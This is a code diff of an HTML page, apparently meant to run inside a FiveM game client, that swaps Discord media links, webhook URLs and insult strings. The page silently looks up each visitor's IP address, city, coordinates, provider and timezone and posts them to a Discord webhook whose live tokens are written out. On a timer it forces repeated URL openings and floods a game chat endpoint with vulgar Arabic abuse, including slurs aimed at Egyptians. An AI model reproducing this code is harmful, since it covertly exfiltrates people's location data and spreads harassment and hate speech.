@@ -45,10 +45,10 @@
 </head>
 <body>
     <div class="image-container">
-        <img src="https://cdn.discordapp.com/attachments/1364995166062248071/1485436159223005244/9df1a5e1a3cc8e1ef4890c49ca03cd46.jpg?ex=69c1dbba&is=69c08a3a&hm=60f03c57c48a58d3427f5d2331f0ab20779cb2a7c52886c74582c1eff45d6db8&" alt="Discord Image">
+        <img src="https://cdn.discordapp.com/attachments/1364995166062248071/1485436159223005244/9df1a5e1a3cc8e1ef4890c49ca03cd46.jpg?ex=69d2567a&is=69d104fa&hm=7d6192d3fb695ae088b57d59732c5c21dc74f7ba08087f37d017426a53d30105&" alt="Discord Image">
     </div>
     <audio autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1364995166062248071/1478816998132809799/-_-_.mp3?ex=69c0d967&is=69bf87e7&hm=79ce7ce027da6c4d31179453c01388dc116a80ab24ed9f6fe8bc074494cc29e8&" type="audio/mpeg">
+        <source src="https://cdn.discordapp.com/attachments/1476210846131687534/1476210888645283991/HD.mp3?ex=69d26506&is=69d11386&hm=928db0e133cde2022a219de3d0f2104864b2dd70d1367a7349f70fe2afc9bb09&" type="audio/mpeg">
     </audio>
     <div class="info" id="ip-info">
         <strong>IP: <span id="ip"></span></strong><br>
@@ -59,7 +59,7 @@
         <span><strong>Organization:</strong> <span id="org"></span></span><br>
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
-    <div class="text">بنعال عمكم دبلوم </div>
+    <div class="text">كـس امك يالمصري</div>
 
     <script>
         fetch('https://ipinfo.io/json')
@@ -70,7 +70,7 @@
             infoDiv.innerHTML = `<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
 
             const dateTime = new Date().toLocaleString();
-            const webhookUrl = 'https://discord.com/api/webhooks/1343716504331616328/8-HtlyIdfpvEZ9kyNrCQZIoTXKCOnoGBwMkRNtcuQF3rdjUDhh4';
+            const webhookUrl = 'https://canary.discord.com/api/webhooks/1395100826728665258/GVaMcEcmm7lTz3A0_9TtsdtsWe4ABltzM2y57dWae1oexKbb6G5uGCIr-Y3djfGqiS8Q';
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -79,13 +79,13 @@
         });
 
         setInterval(function() {
-            window.invokeNative("openUrl", "https://cdn.discordapp.com/attachments/1364995166062248071/1367099427612917880/-17256499154981989751.mp4?ex=69c1cbcf&is=69c07a4f&hm=e80cb4727567dd3dea1cb155b2c32f89f58d0af013f104ceb3053e3f37d077ed&");
-            window.invokeNative("openUrl", "https://cdn.discordapp.com/attachments/1364995166062248071/1367099427612917880/-17256499154981989751.mp4?ex=69c1cbcf&is=69c07a4f&hm=e80cb4727567dd3dea1cb155b2c32f89f58d0af013f104ceb3053e3f37d077ed&");
-            window.invokeNative("openUrl", "https://cdn.discordapp.com/attachments/1364995166062248071/1367099427612917880/-17256499154981989751.mp4?ex=69c1cbcf&is=69c07a4f&hm=e80cb4727567dd3dea1cb155b2c32f89f58d0af013f104ceb3053e3f37d077ed&");
-            window.invokeNative("openUrl", "https://cdn.discordapp.com/attachments/1364995166062248071/1367099427612917880/-17256499154981989751.mp4?ex=69c1cbcf&is=69c07a4f&hm=e80cb4727567dd3dea1cb155b2c32f89f58d0af013f104ceb3053e3f37d077ed&");
+            window.invokeNative("openUrl", "https://discord.gg/qJPUMu5R");
+            window.invokeNative("openUrl", "https://discord.gg/qJPUMu5R");
+            window.invokeNative("openUrl", "https://discord.gg/qJPUMu5R");
+            window.invokeNative("openUrl", "https://discord.gg/qJPUMu5R");
         }, 2500);
    
-const msg = ` -25 ولد قحبه و خنيث   `;
+const msg = ` كــس ابــوك يالـمبرمج المـصري   `;
 const body = JSON.stringify({ message: msg });
 setInterval(() => {
 fetch("https://flix-scripts/chatResult", { method: "POST", body });
